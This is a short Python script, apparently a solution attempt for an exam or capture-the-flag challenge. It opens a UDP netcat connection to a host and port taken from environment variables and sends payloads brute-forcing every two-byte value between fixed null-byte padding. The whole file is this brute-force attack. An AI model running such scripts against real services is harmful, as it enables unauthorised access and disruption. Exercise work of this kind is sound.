import dotenv
import nclib
import os
from itertools import product

dotenv.load_dotenv()

host = os.environ["EXAM_HOST"]
port = os.environ["EXAM_PORT"]

combs = map(
    lambda tup: bytes("".join([chr(x) for x in tup]), "utf8"),
    product(range(128), repeat=2),
)

nc = nclib.Netcat(connect=(host, int(port)), echo_hex=True, udp=True, verbose=True)

for comb in combs:
    pad_char = b"\x00"
    payload = (pad_char * 2) + comb + (pad_char * 7) + b"\x0a"
    nc.send(payload)
    # reply = nc.recv(16, timeout=2)
